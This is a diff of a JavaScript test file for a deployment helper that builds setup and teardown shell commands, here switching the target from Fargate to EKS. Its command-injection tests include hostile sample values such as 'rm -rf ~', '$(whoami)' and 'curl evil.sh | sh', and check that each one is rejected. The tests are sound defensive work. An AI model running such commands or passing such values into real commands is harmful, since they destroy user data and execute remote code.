@@ -18,16 +18,16 @@ import { assembleCommand, isTargetId, TARGETS, TARGET_IDS, teardownCommand } fro
 import { matchIssues, sesPostDeployGuidance } from '../src/agent/troubleshoot.js';
 
 describe('assembleCommand', () => {
-  it('assembles a fargate command with the required flags and no missing', () => {
-    const { command, missing } = assembleCommand(TARGETS.fargate, { domain: 'p.example.com', hostedZoneId: 'Z1' });
+  it('assembles a eks command with the required flags and no missing', () => {
+    const { command, missing } = assembleCommand(TARGETS.eks, { domain: 'p.example.com', hostedZoneId: 'Z1' });
     expect(missing).toHaveLength(0);
-    expect(command).toContain('cd deploy/aws/fargate && bash bin/setup.sh');
+    expect(command).toContain('cd deploy/aws/eks && bash bin/setup.sh');
     expect(command).toContain('--domain p.example.com');
     expect(command).toContain('--hosted-zone-id Z1');
   });
 
   it('reports missing required inputs (never guesses)', () => {
-    const { missing } = assembleCommand(TARGETS.fargate, {});
+    const { missing } = assembleCommand(TARGETS.eks, {});
     expect(missing.map((m) => m.flag).sort()).toEqual(['domain', 'hosted-zone-id']);
   });
 
@@ -43,28 +43,28 @@ describe('assembleCommand', () => {
   });
 
   it('renders boolean flags without a value, and omits them when unset/false', () => {
-    const on = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z', email: true }).command;
+    const on = assembleCommand(TARGETS.eks, { domain: 'd', hostedZoneId: 'z', email: true }).command;
     expect(on).toContain('--email');
     expect(on).not.toContain('--email true');
 
-    const off = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z', email: false }).command;
+    const off = assembleCommand(TARGETS.eks, { domain: 'd', hostedZoneId: 'z', email: false }).command;
     expect(off).not.toContain('--email');
   });
 
   it('SES is on by default: no email flag is emitted unless --no-email is set', () => {
     // Default AWS deploy — neither --email nor --no-email (script defaults SES on).
-    const dflt = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z' }).command;
+    const dflt = assembleCommand(TARGETS.eks, { domain: 'd', hostedZoneId: 'z' }).command;
     expect(dflt).not.toContain('--no-email');
     expect(dflt).not.toMatch(/--email\b/);
     // Opt out — emits --no-email so the deploy script skips SES.
-    const off = assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: 'z', noEmail: true }).command;
+    const off = assembleCommand(TARGETS.eks, { domain: 'd', hostedZoneId: 'z', noEmail: true }).command;
     expect(off).toContain('--no-email');
   });
 
   it('local needs no flags and carries a post-deploy init step', () => {
     const { command, missing } = assembleCommand(TARGETS.local, {});
     expect(missing).toHaveLength(0);
-    expect(command).toBe('cd deploy/local && bash bin/setup.sh');
+    expect(command).toBe('cd deploy/local/docker && bash bin/setup.sh');
     expect(TARGETS.local.postDeploy).toContain('init-platform.sh local');
   });
 
@@ -89,9 +89,9 @@ describe('assembleCommand', () => {
   it('rejects a param value carrying shell metacharacters (command injection)', () => {
     // The assembled command is executed via a shell, so an unquoted injection
     // in any value must be refused rather than interpolated.
-    expect(() => assembleCommand(TARGETS.fargate, { domain: 'd; rm -rf ~', hostedZoneId: 'z' }))
+    expect(() => assembleCommand(TARGETS.eks, { domain: 'd; rm -rf ~', hostedZoneId: 'z' }))
       .toThrow('unsafe characters');
-    expect(() => assembleCommand(TARGETS.fargate, { domain: 'd', hostedZoneId: '$(whoami)' }))
+    expect(() => assembleCommand(TARGETS.eks, { domain: 'd', hostedZoneId: '$(whoami)' }))
       .toThrow('unsafe characters');
   });
 
@@ -113,8 +113,8 @@ describe('teardownCommand', () => {
   it('local/minikube stop the stack and are non-destructive', () => {
     const local = teardownCommand('local');
     expect(local.destructive).toBe(false);
-    expect(local.command).toBe('cd deploy/local && bash bin/shutdown.sh');
-    expect(teardownCommand('minikube').command).toContain('deploy/minikube && bash bin/shutdown.sh');
+    expect(local.command).toBe('cd deploy/local/docker && bash bin/shutdown.sh');
+    expect(teardownCommand('minikube').command).toContain('deploy/local/minikube && bash bin/shutdown.sh');
   });
 
   it('ec2 deletes the CloudFormation stack (destructive) and waits for completion', () => {
@@ -128,17 +128,24 @@ describe('teardownCommand', () => {
     expect(teardownCommand('ec2', { stackName: 'pb-staging' }).command).toContain('--stack-name pb-staging');
   });
 
-  it('fargate runs teardown.sh with the prefix/region and forwards --yes only when asked', () => {
-    const plain = teardownCommand('fargate', { region: 'eu-west-1' });
+  it('eks teardown runs bin/shutdown.sh (default cluster, given region)', () => {
+    const plain = teardownCommand('eks', { region: 'eu-west-1' });
     expect(plain.destructive).toBe(true);
-    expect(plain.command).toContain('bin/teardown.sh --stack-prefix pb --region eu-west-1');
-    expect(plain.command).not.toContain('--yes');
-    expect(teardownCommand('fargate', { assumeYes: true }).command).toContain('--yes');
+    expect(plain.command).toBe('cd deploy/aws/eks && bash bin/shutdown.sh --cluster-name pipeline-builder --region eu-west-1');
+    // a custom --cluster-name is honored (NOT stackName, which eks ignores)
+    expect(teardownCommand('eks', { clusterName: 'pb-prod', region: 'eu-west-1' }).command)
+      .toBe('cd deploy/aws/eks && bash bin/shutdown.sh --cluster-name pb-prod --region eu-west-1');
   });
 
-  it('rejects a stackName or region carrying shell metacharacters (command injection)', () => {
+  it('eks teardown forwards domain + hosted-zone-id (for ACM/Route 53 cleanup) and --yes', () => {
+    const r = teardownCommand('eks', { region: 'us-east-1', domain: 'pb.example.com', hostedZoneId: 'Z123', assumeYes: true });
+    expect(r.command).toBe('cd deploy/aws/eks && bash bin/shutdown.sh --cluster-name pipeline-builder --region us-east-1 --domain pb.example.com --hosted-zone-id Z123 --yes');
+  });
+
+  it('rejects a stackName, cluster-name, or region carrying shell metacharacters (command injection)', () => {
     expect(() => teardownCommand('ec2', { stackName: 'pb; curl evil.sh | sh' })).toThrow('unsafe characters');
     expect(() => teardownCommand('ec2', { region: 'us-east-1 && rm -rf ~' })).toThrow('unsafe characters');
+    expect(() => teardownCommand('eks', { clusterName: 'pb && rm -rf ~' })).toThrow('unsafe characters');
   });
 });
 
@@ -147,8 +154,8 @@ describe('deriveHealthUrl', () => {
     expect(deriveHealthUrl('local', {})).toBe('https://localhost:8443');
     expect(deriveHealthUrl('minikube', {})).toBe('https://localhost:8443');
   });
-  it('uses the domain for ec2/fargate, else null', () => {
-    expect(deriveHealthUrl('fargate', { domain: 'p.example.com' })).toBe('https://p.example.com');
+  it('uses the domain for ec2/eks, else null', () => {
+    expect(deriveHealthUrl('eks', { domain: 'p.example.com' })).toBe('https://p.example.com');
     expect(deriveHealthUrl('ec2', {})).toBeNull();
   });
 });
@@ -226,11 +233,18 @@ describe('checkPrereqs / prereqsSatisfied', () => {
     const names = checkPrereqs('ec2').map((c) => c.name);
     expect(names).toEqual(['AWS CLI', 'AWS credentials']);
   });
-  it('fargate additionally requires openssl (init-secrets.sh generates secrets locally)', () => {
-    const names = checkPrereqs('fargate').map((c) => c.name);
+  it('eks additionally requires eksctl + kubectl + openssl + envsubst', () => {
+    const names = checkPrereqs('eks').map((c) => c.name);
     expect(names).toContain('AWS CLI');
     expect(names).toContain('AWS credentials');
+    expect(names).toContain('eksctl');
+    expect(names).toContain('kubectl');
     expect(names).toContain('openssl');
+    expect(names).toContain('envsubst');
+  });
+  it('eks adds yq only with --with-plugins (like minikube)', () => {
+    expect(checkPrereqs('eks').map((c) => c.name)).not.toContain('yq');
+    expect(checkPrereqs('eks', { withPlugins: true }).map((c) => c.name)).toContain('yq');
   });
   it('prereqsSatisfied honors required vs advisory', () => {
     expect(prereqsSatisfied([{ name: 'x', ok: true, detail: '', required: true }])).toBe(true);
@@ -265,7 +279,7 @@ describe('ai helpers degrade gracefully without a key', () => {
     delete process.env.AWS_ACCESS_KEY_ID;
   });
   it('parseGoal returns null without a key (deterministic fallback)', async () => {
-    await expect(parseGoal('deploy to fargate in us-east-1')).resolves.toBeNull();
+    await expect(parseGoal('deploy to eks in us-east-1')).resolves.toBeNull();
   });
   it('diagnoseFailure returns null without a key', async () => {
     await expect(diagnoseFailure('CREATE_FAILED ...')).resolves.toBeNull();
